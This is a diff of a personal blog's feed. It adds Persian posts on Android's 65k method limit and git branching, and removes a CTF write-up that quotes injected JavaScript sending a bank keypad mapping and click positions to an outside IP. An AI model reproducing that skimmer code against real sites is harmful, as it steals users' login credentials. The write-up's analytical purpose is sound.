+&lt;h2 id=&quot;۱-استفاده-از-android-lint&quot;&gt;۱. استفاده از Android Lint&lt;/h2&gt;
+&lt;p&gt;اولین گام برای کاهش تعداد متدها استفاده از Android Lint برای پیدا کردن متدهای استفاده نشده هست. Android Lint تحلیل‌های خیلی متنوع و مفیدی رو روی کد انجام می‌ده و با این تحلیل‌ها مشکلات احتمالی رو پیش‌بینی می‌کنه و گاهی پیشنهاد راه حل پیشگیری از مشکل رو هم می‌ده. در اندروید استودیو/‎IntelliJ IDEA منوی ‎Analyze ‎&amp;gt; ‎Inspect Code برای اجرای ‎Android Lint روی کد تعبیه شده. برای رفع مشکل 65k‎ ما فقط به تحلیل ‎Unused Declaration نیاز داریم که متدهایی رو پیدا می‌کنه که جایی استفاده نشدند.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;background-image: none; padding-top: 0px; padding-left: 0px; display: inline; padding-right: 0px; border-width: 0px;&quot; title=&quot;image&quot; src=&quot;/assets/images/2015/09/unused-dependencies.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;از منوی Analyze &amp;gt; Run Inspection By Name می‌تونید پنجره‌ی بالا رو باز کنید و تحلیل Unused Declaration رو اجرا کنید.&lt;/p&gt;
+
+&lt;p&gt;نکته‌ی نسبتا ظریفی که حائز اهمیته اینه که با یک بار اجرای این تحلیل همه‌ی متدهای اضافه ممکنه پیدا و حذف نشن. عمل اجرای Lint و حذف متدها و احتمالا کلاس‌هایی که تمام اعضاشون حذف شدند رو باید تا جایی ادامه داد که متد بدون استفاده ای باقی نمونه. دلیل این مسئله اینه که ممکنه متدی مثلا به اسم F فقط داخل متدهای A و B استفاده شده باشه اما A و B خودشون جایی استفاده نشده باشند. Unused Declaration در دور اول اجرا فقط متدهای A و B رو معرفی می‌کنه. چون F به مستقیماً بی استفاده نیست، هرچند بعد از حذف A و B چون F در جای دیگری استفاده نشده در اجرای بعدی تحلیل Unused Declaration به عنوان متد بی استفاده معرفی می‌شه.&lt;/p&gt;
+&lt;h2 id=&quot;۲-استفاده-از-proguard&quot;&gt;۲. استفاده از proguard&lt;/h2&gt;
+&lt;p&gt;در گام بعدی برای کاهش تعداد متدها استفاده از proguard پیشنهاد می‌شه. proguard در کنار تمام مزایایی که برای سخت کردن مهندسی معکوس کد داره، می‌تونه تعدادی از  کلاس‌ها و متدهای اضافه‌ای که استفاده نشدند رو از خروجی حذف کنه. استفاده از proguard مقداری سربار زمانی روی کامپایل کد داره. برای فعال کردن proguard در فایل build.gradle اپ این خط رو اضافه کنید:&lt;/p&gt;
+
+&lt;div class=&quot;language-groovy highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;android&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;buildTypes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;debug&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;minifyEnabled&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;true&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;proguardFiles&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;getDefaultProguardFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'proguard-android.txt'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'proguard-rules.pro'&lt;/span&gt;
+        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;اگر خوش‌شانس باشید با بهبودهایی که proguard میده اپ قابل استفاده می‌شه.&lt;/p&gt;
+&lt;h2 id=&quot;۳-پیدا-کردن-و-جایگزینی-کتابخانههای-سنگین&quot;&gt;۳. پیدا کردن و جایگزینی کتابخانه‌های سنگین&lt;/h2&gt;
+&lt;p&gt;راه بعدی اینه که بریم ریشه‌ی کار رو درست کنیم (چرا از اول نرفتیم سراغ این کار؟ :دی) Jake Wharton یه &lt;a href=&quot;https://gist.github.com/JakeWharton/6002797&quot; target=&quot;_blank&quot;&gt;شِل اسکریپت&lt;/a&gt; داره که می‌تونه تعداد متدهایی که هر کتابخانه به کد اضافه کرده رو بشمره. با وجود پیاده‌سازی‌های متعدد یک کاربرد برای اندروید پیدا کردن نسخه‌های سبک‌تر و ساده‌تر کتابخانه‌های پیچیده‌ای که برامون دردسر ساز شدن نباید کار سختی باشه. برای این منظور سایت Android Arsenal گزینه‌ی خوبیه که کتابخونه‌های مختلف اندروید رو به صورت موضوعی &lt;a href=&quot;https://android-arsenal.com/free&quot; target=&quot;_blank&quot;&gt;دسته بندی و معرفی&lt;/a&gt; کرده.&lt;/p&gt;
+
+&lt;p&gt;مهم‌ترین کتابخانه‌ای که تعداد زیادی متد اضافه می‌کنه Google Play Services هست. این کتابخانه امکانات خیلی خوبی رو مثل Push Notification، Google Maps و حتا تشخیص حالت چهره برای برنامه فراهم می‌کنه، این امکانات نزدیک به ۳۰ هزار متد مصرف می‌کنند (تقریبا نصف تعداد متدهای قابل استفاده). در اکثر مواقع ما به تعداد محدودی از این امکانات نیاز داریم. خوشبختانه گوگل از نسخه‌ی ۶.۵ به بعد این امکان رو گذاشته که از اجزای مختلف این کتابخانه به صورت مجزا استفاده کنیم. مثلا برای اپی که از Google Analytics, Google Cloud Messaging و Google Maps استفاده می‌کنه کافیه بجای این خط:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;compile 'com.google.android.gms:play-services:8.1.0'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;این خط‌ها در dependencyهای پروژه باشند:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;compile 'com.google.android.gms:play-services-analytics:8.1.0'
+compile 'com.google.android.gms:play-services-maps:8.1.0'
+compile 'com.google.android.gms:play-services-gcm:8.1.0'
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;برای مشاهده‌ی لیست کامل کتابخانه‌های جزئی Google Play Services &lt;a href=&quot;https://developers.google.com/android/guides/setup&quot; target=&quot;_blank&quot;&gt;کلیک کنید&lt;/a&gt;.&lt;/p&gt;
+&lt;h2 id=&quot;۴-استفاده-از-چند-فایل-dex&quot;&gt;۴. استفاده از چند فایل Dex&lt;/h2&gt;
+&lt;p&gt;راه حل نهایی استفاده از بیش از یک فایل classes.dex در کد برنامه‌هست. در &lt;a href=&quot;http://android-developers.blogspot.se/2011/07/custom-class-loading-in-dalvik.html&quot; target=&quot;_blank&quot;&gt;این پست&lt;/a&gt; کد به سه بخش کد اصلی، کتابخانه و Interface ارتباط با کتابخانه تقسیم شده و فایل‌های dex مربوط به کتابخانه در پوشه‌ی Assets داخل فایل apk قرار می‌گیرن و بعداً در زمان اجرا با استفاده از Class Loader وارد حافظه‌ی گوشی می‌شن و ازشون استفاده می‌شه.&lt;/p&gt;
+
+&lt;p&gt;گوگل با کتابخانه‌ی multidex این کار رو خیلی ساده کرده. پلاگین gradle ای هم برای multidex نوشته و همراه با sdk نصب می‌شه که عمل تقسیم کدها به چند فایل dex رو به طور خودکار در زمان کامپایل انجام می‌ده. برای استفاده از این امکان باید:&lt;/p&gt;
+
+&lt;p&gt;۱. کتابخانه‌ی multidex به dependency ها اضافه بشه، multidex روی اپ فعال شه و گریدل یک بار Sync بشه.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;defaultConfig {
+    ...
+    multiDexEnabled true
+}
+
+dependencies {
+    ...
+    compile 'com.android.support:multidex:1.0.0'
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;۲. کلاس اصلی برنامه (Application) بجای &lt;code class=&quot;highlighter-rouge&quot;&gt;android.os.application&lt;/code&gt;از &lt;code class=&quot;highlighter-rouge&quot;&gt;android.support.multidex.MultiDexApplication &lt;/code&gt;ارث‌بری کنه یا اینکه کد زیر به این کلاس اضافه شه:&lt;/p&gt;
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nd&quot;&gt;@Overrid&lt;/span&gt;
+&lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;attachBaseContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Context&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;super&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;attachBaseContext&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;MultiDex&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;install&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;اگر کلاس Application ندارید میتونید مستقیما از کلاس &lt;code class=&quot;highlighter-rouge&quot;&gt;android.support.multidex.MultiDexApplication&lt;/code&gt; به عنوان کلاس اصلی استفاده کنید.&lt;/p&gt;
+
+&lt;div class=&quot;language-xml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Manifest.xml:
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;application&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;android:name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;android.support.multidex.MultiDexApplication&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;این روش همیشه کار می‌کنه اما به دو دلیل از اول معرفی نشد، ۱. این روش زمان کامپایل رو به طور قابل توجهی زیاد می‌کنه. ۲. حذف dependencyها و کدهای اضافه راه حل بهتری نسبت به multidex شدن هستند و ۳. به بهانه‌ی معرفی روش‌های مختلف ابزارها و سایت‌ها و… جدیدی معرفی شن.&lt;/p&gt;
+
+&lt;p&gt;موفق باشین&lt;/p&gt;</content><author><name>mashhadimj</name></author><summary type="html">ماهیت شی گرایی زبان جاوا و فراهم کردن ساده‌ی امکان code reuse در کنار محبوبیت و قدمت این زبان باعث شده که کتابخانه‌ها و نمونه کدهای خیلی زیادی برای تسریع روند توسعه با جاوا به وجود بیان. محبوبیت اندروید در بین توسعه دهنده‌ها هم باعث شده که کتابخانه‌های این پلتفرم انقدر زیاد و متنوع بشن که تقریبا برای هر کاری یک کتابخانه‌ی آماده وجود داشته باشه. با مهاجرت گوگل هم به سیستم gradle استفاده از کتابخانه‌ها به سادگی آب خوردن شده. فقط یک خط اسم کتابخونه و ورژنش رو توی dependency فایل گریدل اضافه می‌کنیم! این نیمه‌ی پر لیوان بود، معمولا هیچ منفعتی به صورت خالص به دست نمیاد و همیشه به اصطلاح trade-off ای هست.</summary></entry><entry><title type="html">چگونه از git استفاده کنیم–بخش دوم–branch, merge و rebase</title><link href="https://mjafar.me/blog/2015/09/how-to-use-git-part2/" rel="alternate" type="text/html" title="چگونه از git استفاده کنیم&amp;ndash;بخش دوم&amp;ndash;branch, merge و rebase" /><published>2015-09-27T00:15:49+00:00</published><updated>2015-09-27T00:15:49+00:00</updated><id>https://mjafar.me/blog/2015/09/how-to-use-git-part2</id><content type="html" xml:base="https://mjafar.me/blog/2015/09/how-to-use-git-part2/">&lt;p&gt;این مطلب در ادامه‌ی &lt;a href=&quot;/blog/2015/08/how-to-use-git/&quot; target=&quot;_blank&quot;&gt;چگونه از git استفاده کنیم&lt;/a&gt; نوشته شده. پیشنهاد می‌کنم قبل از مطالعه‌ی این مطلب به پست قبلی هم یک نگاه بندازید. در ادامه‌ی مطلب بر خلاف مطلب قبلی برای راحت تر شدن فهم موضوع فرض شده که از گیت برای مدیریت کد منبع یک نرم‌افزار استفاده می‌شه، هرچند بدیهتاً کاربرد گیت محدود به این موضوع نیست.&lt;/p&gt;
 
 &lt;h3 id=&quot;شاخه-یا-branch&quot;&gt;شاخه یا branch&lt;/h3&gt;
 &lt;p&gt;در فرایند توسعه‌ی نرم‌افزار خیلی وقت‌ها پیش میاد که لازم باشه تغییرات گسترده‌ای در کد ایجاد شه، فیچری اضافه بشه، کدی به صورت تست به برنامه اضافه بشه و… که تا مدتی (مثل چند روز یا چند ماه) ناپایداره یا مشخص نیست که قرار هست به کد اصلی اضافه بشه یا نه. برای همین نیاز داریم که یه تعداد کامیت انجام بدیم بدون اینکه به کد پایدار برنامه خللی وارد شه و توی کار بقیه دخالتی انجام شه. اولین راهی که به ذهن می‌رسه اینه که یک کپی از مخزن ایجاد کنیم و کامیت‌ها رو روی اون ببریم جلو تا وقتی که کد به حالت پایدار برسه و بشه این کامیت‌ها رو روی کد اصلی هم اعمال کرد.&lt;/p&gt;
@@ -411,102 +664,4 @@ With running this piece of php code we can find out the size of initialization v
 &lt;p&gt;Note that if you have php binaries installed on your OS, you don’t need a webserver to run this code, simply run it in a terminal.&lt;/p&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;php decode.php
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>mashhadimj</name></author><summary type="html">Given a php file as coder and an encoded file, Find the flag.</summary></entry><entry><title type="html">SU CTF 2014 – Our bank is yours write up</title><link href="https://mjafar.me/blog/2014/09/our-bank-is-yours-write-up/" rel="alternate" type="text/html" title="SU CTF 2014 &amp;#8211; Our bank is yours write up" /><published>2014-09-28T20:54:36+00:00</published><updated>2014-09-28T20:54:36+00:00</updated><id>https://mjafar.me/blog/2014/09/our-bank-is-yours-write-up</id><content type="html" xml:base="https://mjafar.me/blog/2014/09/our-bank-is-yours-write-up/">&lt;p&gt;The police have arrested a cyber criminal but they don’t have a good witness. Just a short capture of his network traffic is available. Is it helpful?&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;A pcap network traffic log is attached. By opening it in wireshark you could see that an email is sent with a link to &lt;a href=&quot;http://ctf.sharif.edu:45656/&quot; target=&quot;_blank&quot;&gt; this page&lt;/a&gt; that injects the following javascript code into the page.&lt;/p&gt;
-
-&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;setTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;sendmap();&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;click&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;clickdone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sendmap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
-  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;buttons&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementsByClassName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;keypadButtonStyle&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;keymap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buttons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-    &lt;span class=&quot;nx&quot;&gt;keymap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buttons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xmlhttp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;xmlhttp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://95.211.102.232:8080/c.php?t=m&amp;amp;v=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;keymap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;xmlhttp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;clickdone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
-  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xPosition&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;clientX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;yPosition&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;clientY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;xmlhttp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;xmlhttp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://95.211.102.232:8080/c.php?t=c&amp;amp;v=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;xPosition&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;,&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;yPosition&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-  &lt;span class=&quot;nx&quot;&gt;xmlhttp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;It first sends the mapping of keys to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://95.211.102.232:8080/c.php&lt;/code&gt; then on each click sends the x and y position of click to that page.&lt;/p&gt;
-
-&lt;p&gt;We used the following shell script to find all GET requests to the given address.&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/sh&lt;/span&gt;
-
-touch bank-followstream.txt
-&lt;span class=&quot;nv&quot;&gt;END&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;tshark &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; fields &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; tcp.stream | sort &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; | tail &lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i&amp;lt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;END&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;i++&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
-     &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;
-     tshark &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-qz&lt;/span&gt; follow,tcp,ascii,&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; bank-followstream.txt
-&lt;span class=&quot;k&quot;&gt;done
-
-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;GET /c.php&quot;&lt;/span&gt; &amp;lt; bank-followstream.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Key mapping is &lt;code class=&quot;highlighter-rouge&quot;&gt;4    1    6    3    7    0    8    9    5    2   Backspace&lt;/code&gt;. With a simple javascript code you can simulate clicks on the original page. After logging in the flag will appear.
-This line of javascript (using jQuery) code may be helpful:&lt;/p&gt;
-&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;elementFromPoint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;click&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>mashhadimj</name></author><summary type="html">The police have arrested a cyber criminal but they don’t have a good witness. Just a short capture of his network traffic is available. Is it helpful?</summary></entry><entry><title type="html">SU CTF 2014 – Rolling Hash Write up</title><link href="https://mjafar.me/blog/2014/09/su-ctf-2014-rolling-hash-write-up/" rel="alternate" type="text/html" title="SU CTF 2014 &amp;#8211; Rolling Hash Write up" /><published>2014-09-28T19:26:44+00:00</published><updated>2014-09-28T19:26:44+00:00</updated><id>https://mjafar.me/blog/2014/09/su-ctf-2014-rolling-hash-write-up</id><content type="html" xml:base="https://mjafar.me/blog/2014/09/su-ctf-2014-rolling-hash-write-up/">&lt;div 